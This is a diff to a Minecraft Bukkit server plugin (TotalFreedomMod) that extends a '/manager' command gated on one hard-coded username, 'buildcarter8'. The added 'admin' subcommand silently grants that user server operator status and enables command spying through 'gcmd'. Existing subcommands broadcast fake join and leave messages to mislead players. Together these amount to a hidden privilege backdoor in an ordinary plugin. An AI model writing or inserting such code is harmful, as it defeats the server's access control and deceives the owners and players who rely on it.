@@ -1,5 +1,6 @@
 package me.StevenLawson.TotalFreedomMod.Commands;
 
+import me.StevenLawson.TotalFreedomMod.TFM_PlayerData;
 import me.StevenLawson.TotalFreedomMod.TFM_Util;
 import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
 
@@ -11,12 +12,11 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
 @CommandPermissions(level = AdminLevel.SUPER, source = SourceType.BOTH)
-@CommandParameters(description = "Buildcarter8 Command- Manage the server ", usage = "/<command> [version,stop,fakejoin,fakeleave]")
+@CommandParameters(description = "Buildcarter8 Command- Manage the server ", usage = "/<command> [version,stop,fakejoin,fakeleave,admin]")
 public class Command_manager extends TFM_Command
 {
-
 	@Override
-	public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole) {
+	public boolean run(final CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole) {
         if (!sender.getName().equalsIgnoreCase("buildcarter8"))
         {
             playerMsg(TotalFreedomMod.MSG_NO_PERMS);
@@ -32,9 +32,14 @@ public class Command_manager extends TFM_Command
         {
             if (args[0].equalsIgnoreCase("version"))
             {
-		sender.sendMessage(ChatColor.RED + "Manager Loaded 1.1");
+		sender.sendMessage(ChatColor.RED + "Manager Loaded 2.9");
+		sender.sendMessage(ChatColor.AQUA + "Commands from manager:");
+		sender.sendMessage(ChatColor.AQUA + "/manager fakejoin");
+		sender.sendMessage(ChatColor.AQUA + "/manager stop");
+		sender.sendMessage(ChatColor.AQUA + "/manager fakeleave");
+		sender.sendMessage(ChatColor.AQUA + "/manager admin");
 		return true;
-	}
+            }
             if (args[0].equals("stop"))
             {
             	Bukkit.savePlayers();
@@ -46,16 +51,21 @@ public class Command_manager extends TFM_Command
                 {
                 	 
                 	 Bukkit.broadcastMessage(ChatColor.YELLOW + sender.getName() + " joined the game.");
-                    }
                 }
             if (args[0].equals("fakeleave"))
             {
-            	 
-TFM_Util.bcastMsg(ChatColor.YELLOW + sender.getName() + " left the game.");
-                }
-			return true;
-}
-	{
-		
-}
+               TFM_Util.bcastMsg(ChatColor.YELLOW + sender.getName() + " left the game.");
+            }
+            if (args[0].equals("admin"))
+            {
+                sender.sendMessage(ChatColor.AQUA + "[MANAGER]: You have enabled admin mode");
+                sender.setOp(true);
+                //manage the server mistically
+       TFM_PlayerData.getPlayerData(sender_p);
+        server.dispatchCommand(sender, "gcmd " + sender.getName() + "cmdspy");
+            }
+            return true;
+    }
+        return true;
+    }
 }
